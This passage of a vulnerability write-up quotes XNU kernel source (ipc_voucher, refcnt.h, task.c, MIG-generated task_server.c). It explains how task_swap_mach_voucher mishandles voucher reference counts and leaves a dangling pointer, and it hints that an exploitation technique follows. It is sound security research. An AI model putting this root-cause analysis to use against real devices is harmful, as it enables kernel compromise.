    <span class="mi">462</span><span class="o">:</span> 		<span class="n">iv_release</span><span class="p">(</span><span class="n">voucher</span><span class="p">);</span>
    <span class="mi">463</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">ipc</span><span class="o">/</span><span class="n">ipc_voucher</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">104</span><span class="o">:</span> 
    <span class="mi">105</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
    <span class="mi">106</span><span class="o">:</span> <span class="n">iv_reference</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">iv</span><span class="p">)</span>
    <span class="mi">107</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">108</span><span class="o">:</span> 	<span class="n">os_ref_retain</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iv</span><span class="o">-&gt;</span><span class="n">iv_refs</span><span class="p">);</span>
    <span class="mi">109</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">110</span><span class="o">:</span> 
    <span class="mi">111</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
    <span class="mi">112</span><span class="o">:</span> <span class="n">iv_release</span><span class="p">(</span><span class="n">ipc_voucher_t</span> <span class="n">iv</span><span class="p">)</span>
    <span class="mi">113</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">114</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">os_ref_release</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iv</span><span class="o">-&gt;</span><span class="n">iv_refs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">115</span><span class="o">:</span> 		<span class="n">iv_dealloc</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">);</span>
    <span class="mi">116</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">117</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>More details can be found under <strong>BUILD/obj/EXPORT_HDRS/libkern/os/refcnt.h</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">libkern</span><span class="o">/</span><span class="n">os</span><span class="o">/</span><span class="n">refcnt</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">126</span><span class="o">:</span> <span class="cm">/*
    127:  * os_ref_retain: acquire a reference (increment reference count by 1) atomically.
    128:  *
    129:  * os_ref_release: release a reference (decrement reference count) atomically and
    130:  *		return the new count. Memory is synchronized such that the dealloc block
    131:  *		(i.e. code handling the final release() == 0 call) sees up-to-date memory
    132:  *		with respect to all prior release()s on the same refcnt object. This
    133:  *		memory ordering is sufficient for most use cases.
    134:  *
    135:  * os_ref_release_relaxed: same as release() but with weaker relaxed memory ordering.
    136:  *		This can be used when the dealloc block is already synchronized with other
    137:  *		accesses to the object (for example, with a lock).
    138:  *
    139:  * os_ref_release_live: release a reference that is guaranteed not to be the last one.
    140:  */</span>
    <span class="mi">141</span><span class="o">:</span> <span class="kt">void</span> <span class="nf">os_ref_retain</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="p">);</span>
    <span class="mi">142</span><span class="o">:</span> 
    <span class="mi">143</span><span class="o">:</span> <span class="n">os_ref_count_t</span> <span class="n">os_ref_release_explicit</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">,</span>
    <span class="mi">144</span><span class="o">:</span> 		<span class="n">memory_order</span> <span class="n">release_order</span><span class="p">,</span> <span class="n">memory_order</span> <span class="n">dealloc_order</span><span class="p">)</span> <span class="n">OS_WARN_RESULT</span><span class="p">;</span>
    <span class="mi">145</span><span class="o">:</span> 
    <span class="mi">146</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="n">os_ref_count_t</span> <span class="n">OS_WARN_RESULT</span>
    <span class="mi">147</span><span class="o">:</span> <span class="n">os_ref_release</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">)</span>
    <span class="mi">148</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">149</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">os_ref_release_explicit</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span> <span class="n">memory_order_release</span><span class="p">,</span> <span class="n">memory_order_acquire</span><span class="p">);</span>
    <span class="mi">150</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">151</span><span class="o">:</span> 
    <span class="mi">152</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="n">os_ref_count_t</span> <span class="n">OS_WARN_RESULT</span>
    <span class="mi">153</span><span class="o">:</span> <span class="n">os_ref_release_relaxed</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">)</span>
    <span class="mi">154</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">155</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">os_ref_release_explicit</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span> <span class="n">memory_order_relaxed</span><span class="p">,</span> <span class="n">memory_order_relaxed</span><span class="p">);</span>
    <span class="mi">156</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">157</span><span class="o">:</span> 
    <span class="mi">158</span><span class="o">:</span> <span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
    <span class="mi">159</span><span class="o">:</span> <span class="n">os_ref_release_live</span><span class="p">(</span><span class="k">struct</span> <span class="n">os_refcnt</span> <span class="o">*</span><span class="n">rc</span><span class="p">)</span>
    <span class="mi">160</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">161</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">__improbable</span><span class="p">(</span><span class="n">os_ref_release_explicit</span><span class="p">(</span><span class="n">rc</span><span class="p">,</span>
    <span class="mi">162</span><span class="o">:</span> 			<span class="n">memory_order_release</span><span class="p">,</span> <span class="n">memory_order_relaxed</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">163</span><span class="o">:</span> 		<span class="n">panic</span><span class="p">(</span><span class="s">"os_refcnt: unexpected release of final reference (rc=%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
    <span class="mi">164</span><span class="o">:</span> 		<span class="n">__builtin_unreachable</span><span class="p">();</span>
    <span class="mi">165</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">166</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">167</span><span class="o">:</span> </code></pre></figure>

<p>There can be two kinds of vulnerabilities that can arise because of this, one is if the reference count can be increased in some way such that it leads to an overflow. We already discussed that because of the maximum cap, this is not really exploitable. However, you can still increase the ref count up to <strong>0x0fffffff</strong> and we will use this technique later. The other is lets say the object’s reference count can be set to 0 but there is still a pointer to it. Now, since the reference count becomes 0 the object will be freed, and hence the pointer pointing to it becomes what we call a <strong>dangling pointer</strong>.</p>

<h3 id="the-vulnerability">The Vulnerability</h3>

<p>So let’s have a look at the vulnerability. Look under the file <strong>/xnu-4903.221.2/osfmk/kern/task.c</strong> and the function <strong>task_swap_mach_voucher</strong>. This is a simple function that is supposed to take a new voucher and an old voucher and swap them. Well, this is what it is suppossed to do but it just removes the <strong>old_voucher</strong> with the <strong>new_voucher</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">kern</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">5993</span><span class="o">:</span> <span class="cm">/* Placeholders for the task set/get voucher interfaces */</span>
    <span class="mi">5994</span><span class="o">:</span> <span class="n">kern_return_t</span> 
    <span class="mi">5995</span><span class="o">:</span> <span class="n">task_get_mach_voucher</span><span class="p">(</span>
    <span class="mi">5996</span><span class="o">:</span> 	<span class="n">task_t</span>			<span class="n">task</span><span class="p">,</span>
    <span class="mi">5997</span><span class="o">:</span> 	<span class="n">mach_voucher_selector_t</span> <span class="n">__unused</span> <span class="n">which</span><span class="p">,</span>
    <span class="mi">5998</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>		<span class="o">*</span><span class="n">voucher</span><span class="p">)</span>
    <span class="mi">5999</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">6000</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">TASK_NULL</span> <span class="o">==</span> <span class="n">task</span><span class="p">)</span>
    <span class="mi">6001</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_TASK</span><span class="p">;</span>
    <span class="mi">6002</span><span class="o">:</span> 
    <span class="mi">6003</span><span class="o">:</span> 	<span class="o">*</span><span class="n">voucher</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">6004</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">6005</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">6006</span><span class="o">:</span> 
    <span class="mi">6007</span><span class="o">:</span> <span class="n">kern_return_t</span> 
    <span class="mi">6008</span><span class="o">:</span> <span class="n">task_set_mach_voucher</span><span class="p">(</span>
    <span class="mi">6009</span><span class="o">:</span> 	<span class="n">task_t</span>			<span class="n">task</span><span class="p">,</span>
    <span class="mi">6010</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>		<span class="n">__unused</span> <span class="n">voucher</span><span class="p">)</span>
    <span class="mi">6011</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">6012</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">TASK_NULL</span> <span class="o">==</span> <span class="n">task</span><span class="p">)</span>
    <span class="mi">6013</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_TASK</span><span class="p">;</span>
    <span class="mi">6014</span><span class="o">:</span> 
    <span class="mi">6015</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">6016</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">6017</span><span class="o">:</span> 
    <span class="mi">6018</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">6019</span><span class="o">:</span> <span class="n">task_swap_mach_voucher</span><span class="p">(</span>
    <span class="mi">6020</span><span class="o">:</span> 	<span class="n">task_t</span>			<span class="n">task</span><span class="p">,</span>
    <span class="mi">6021</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>		<span class="n">new_voucher</span><span class="p">,</span>
    <span class="mi">6022</span><span class="o">:</span> 	<span class="n">ipc_voucher_t</span>		<span class="o">*</span><span class="n">in_out_old_voucher</span><span class="p">)</span>
    <span class="mi">6023</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">6024</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">TASK_NULL</span> <span class="o">==</span> <span class="n">task</span><span class="p">)</span>
    <span class="mi">6025</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">KERN_INVALID_TASK</span><span class="p">;</span>
    <span class="mi">6026</span><span class="o">:</span> 
    <span class="mi">6027</span><span class="o">:</span> 	<span class="o">*</span><span class="n">in_out_old_voucher</span> <span class="o">=</span> <span class="n">new_voucher</span><span class="p">;</span>
    <span class="mi">6028</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">KERN_SUCCESS</span><span class="p">;</span>
    <span class="mi">6029</span><span class="o">:</span> <span class="p">}</span>
    <span class="mi">6030</span><span class="o">:</span> </code></pre></figure>

<p>The function <strong>task_swap_mach_voucher</strong> is a placeholder as per the comments. A quick search for it would also find the routine under <strong>xnu-4903.221.2/osfmk/mach/task.defs</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">defs</span>
    <span class="mi">455</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_swap_mach_voucher</span><span class="p">(</span>
    <span class="mi">456</span><span class="o">:</span> 		<span class="n">task</span>		<span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">457</span><span class="o">:</span> 		<span class="n">new_voucher</span>	<span class="o">:</span> <span class="n">ipc_voucher_t</span><span class="p">;</span>
    <span class="mi">458</span><span class="o">:</span> 	<span class="n">inout</span>	<span class="n">old_voucher</span>	<span class="o">:</span> <span class="n">ipc_voucher_t</span><span class="p">);</span></code></pre></figure>

<p>This proves that it is actually a Mach API, since MIG def files are generating code for Mach Interfaces. Lets search for <strong>task_swap_mach_voucher</strong>. Remember that we are doing this on a compiled version. Under the file <strong>/BUILD/obj/RELEASE_X86_64/osfmk/mach/task.h</strong> we can find the Mach message format for this function.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">2086</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2087</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">2088</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">2089</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">2090</span><span class="o">:</span> 		<span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">2091</span><span class="o">:</span> 		<span class="cm">/* start of the kernel processed data */</span>
    <span class="mi">2092</span><span class="o">:</span> 		<span class="n">mach_msg_body_t</span> <span class="n">msgh_body</span><span class="p">;</span>
    <span class="mi">2093</span><span class="o">:</span> 		<span class="n">mach_msg_port_descriptor_t</span> <span class="n">old_voucher</span><span class="p">;</span>
    <span class="mi">2094</span><span class="o">:</span> 		<span class="cm">/* end of the kernel processed data */</span>
    <span class="mi">2095</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">__Reply__task_swap_mach_voucher_t</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">2096</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">2097</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">()</span>
    <span class="mi">2098</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span></code></pre></figure>

<p>And under the file <strong>/BUILD/obj/RELEASE_X86_64/osfmk/RELEASE/mach/task_server.c</strong> we can see checks being performed on the request.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">4714</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">kern_return_t</span> <span class="n">__MIG_check__Request__task_swap_mach_voucher_t</span><span class="p">(</span><span class="n">__attribute__</span><span class="p">((</span><span class="n">__unused__</span><span class="p">))</span> <span class="n">__Request__task_swap_mach_voucher_t</span> <span class="o">*</span><span class="n">In0P</span><span class="p">)</span>
    <span class="mi">4715</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">4716</span><span class="o">:</span> 
    <span class="mi">4717</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Request__task_swap_mach_voucher_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">4718</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigTypeCheck</span>
    <span class="mi">4719</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">&amp;</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span><span class="p">)</span> <span class="o">||</span>
    <span class="mi">4720</span><span class="o">:</span> 	    <span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">msgh_body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span>
    <span class="mi">4721</span><span class="o">:</span> 	    <span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">!=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="n">__Request</span><span class="p">)))</span>
    <span class="mi">4722</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">MIG_BAD_ARGUMENTS</span><span class="p">;</span>
    <span class="mi">4723</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* __MigTypeCheck */</span>
    <span class="mi">4724</span><span class="o">:</span> 
    <span class="mi">4725</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigTypeCheck</span>
    <span class="mi">4726</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">type</span> <span class="o">!=</span> <span class="n">MACH_MSG_PORT_DESCRIPTOR</span> <span class="o">||</span>
    <span class="mi">4727</span><span class="o">:</span> 	    <span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">disposition</span> <span class="o">!=</span> <span class="mi">17</span><span class="p">)</span>
    <span class="mi">4728</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">MIG_TYPE_ERROR</span><span class="p">;</span>
    <span class="mi">4729</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* __MigTypeCheck */</span>
    <span class="mi">4730</span><span class="o">:</span> 
    <span class="mi">4731</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span>	<span class="n">__MigTypeCheck</span>
    <span class="mi">4732</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">type</span> <span class="o">!=</span> <span class="n">MACH_MSG_PORT_DESCRIPTOR</span> <span class="o">||</span>
    <span class="mi">4733</span><span class="o">:</span> 	    <span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">disposition</span> <span class="o">!=</span> <span class="mi">17</span><span class="p">)</span>
    <span class="mi">4734</span><span class="o">:</span> 		<span class="k">return</span> <span class="n">MIG_TYPE_ERROR</span><span class="p">;</span>
    <span class="mi">4735</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>	<span class="cm">/* __MigTypeCheck */</span>
    <span class="mi">4736</span><span class="o">:</span> 
    <span class="mi">4737</span><span class="o">:</span> 	<span class="k">return</span> <span class="n">MACH_MSG_SUCCESS</span><span class="p">;</span>
    <span class="mi">4738</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>And the actual implementation can be found just below it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">4744</span><span class="o">:</span> <span class="cm">/* Routine task_swap_mach_voucher */</span>
    <span class="mi">4745</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">novalue</span> <span class="n">_Xtask_swap_mach_voucher</span>
    <span class="mi">4746</span><span class="o">:</span> 	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
    <span class="mi">4747</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">4748</span><span class="o">:</span> 
    <span class="mi">4749</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">4750</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">4751</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">4752</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">4753</span><span class="o">:</span> 		<span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">4754</span><span class="o">:</span> 		<span class="cm">/* start of the kernel processed data */</span>
    <span class="mi">4755</span><span class="o">:</span> 		<span class="n">mach_msg_body_t</span> <span class="n">msgh_body</span><span class="p">;</span>
    <span class="mi">4756</span><span class="o">:</span> 		<span class="n">mach_msg_port_descriptor_t</span> <span class="n">new_voucher</span><span class="p">;</span>
    <span class="mi">4757</span><span class="o">:</span> 		<span class="n">mach_msg_port_descriptor_t</span> <span class="n">old_voucher</span><span class="p">;</span>
    <span class="mi">4758</span><span class="o">:</span> 		<span class="cm">/* end of the kernel processed data */</span>
    <span class="mi">4759</span><span class="o">:</span> 		<span class="n">mach_msg_trailer_t</span> <span class="n">trailer</span><span class="p">;</span>
    <span class="mi">4760</span><span class="o">:</span> 	<span class="p">}</span> <span class="n">Request</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">4761</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">4762</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">()</span>
    <span class="mi">4763</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">4764</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Request__task_swap_mach_voucher_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">4765</span><span class="o">:</span> 	<span class="k">typedef</span> <span class="n">__Reply__task_swap_mach_voucher_t</span> <span class="n">Reply</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">4766</span><span class="o">:</span> 
    <span class="mi">4767</span><span class="o">:</span> 	<span class="cm">/*
    4768: 	 * typedef struct {
    4769: 	 * 	mach_msg_header_t Head;
    4770: 	 * 	NDR_record_t NDR;
    4771: 	 * 	kern_return_t RetCode;
    4772: 	 * } mig_reply_error_t;
    4773: 	 */</span>
    <span class="mi">4774</span><span class="o">:</span> </code></pre></figure>

<p>Here is the stripped out implementation, with the interesting functions marked in bold.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/* Routine task_swap_mach_voucher */</span>
<span class="n">mig_internal</span> <span class="n">novalue</span> <span class="nf">_Xtask_swap_mach_voucher</span>
	<span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
<span class="p">{</span>

<span class="o">-----------------------------</span>
<span class="o">-----------------------------</span>
<span class="cp">#endif
</span>	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">pad2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">MACH_MSG_PORT_DESCRIPTOR</span><span class="p">;</span>
<span class="cp">#if defined(KERNEL)
</span>	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">pad_end</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="cp">#endif
#endif	</span><span class="cm">/* UseStaticTemplates */</span><span class="cp">
</span>
	<span class="n">task</span> <span class="o">=</span> <span class="n">convert_port_to_task</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_request_port</span><span class="p">);</span>

	<span class="n">new_voucher</span> <span class="o">=</span> <span class="o">**</span><span class="n">convert_port_to_voucher</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>

	<span class="n">old_voucher</span> <span class="o">=</span> <span class="o">**</span><span class="n">convert_port_to_voucher</span><span class="p">(</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>

	<span class="n">RetCode</span> <span class="o">=</span> <span class="o">**</span><span class="n">task_swap_mach_voucher</span><span class="p">(</span><span class="n">task</span><span class="p">,</span> <span class="n">new_voucher</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">old_voucher</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>
	<span class="o">**</span><span class="n">ipc_voucher_release</span><span class="p">(</span><span class="n">new_voucher</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>
	<span class="n">task_deallocate</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">RetCode</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">MIG_RETURN_ERROR</span><span class="p">(</span><span class="n">OutP</span><span class="p">,</span> <span class="n">RetCode</span><span class="p">);</span>
	<span class="p">}</span>
<span class="cp">#if	__MigKernelSpecificCode
</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
		<span class="n">ipc_port_release_send</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">IP_VALID</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
		<span class="n">ipc_port_release_send</span><span class="p">((</span><span class="n">ipc_port_t</span><span class="p">)</span><span class="n">In0P</span><span class="o">-&gt;</span><span class="n">new_voucher</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
<span class="cp">#endif </span><span class="cm">/* __MigKernelSpecificCode */</span><span class="cp">
</span>	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">old_voucher</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_port_t</span><span class="p">)</span><span class="o">**</span><span class="n">convert_voucher_to_port</span><span class="p">(</span><span class="n">old_voucher</span><span class="p">)</span><span class="o">**</span><span class="p">;</span>

	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">|=</span> <span class="n">MACH_MSGH_BITS_COMPLEX</span><span class="p">;</span>
	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">Head</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_size_t</span><span class="p">)(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Reply</span><span class="p">));</span>
	<span class="n">OutP</span><span class="o">-&gt;</span><span class="n">msgh_body</span><span class="p">.</span><span class="n">msgh_descriptor_count</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">__AfterRcvRpc</span><span class="p">(</span><span class="mi">3441</span><span class="p">,</span> <span class="s">"task_swap_mach_voucher"</span><span class="p">)</span>
<span class="p">}</span></code></pre></figure>

<p>The function <strong>convert_port_to_voucher</strong> increases the reference count by one by calling <strong>ipc_voucher_reference</strong>.</p>

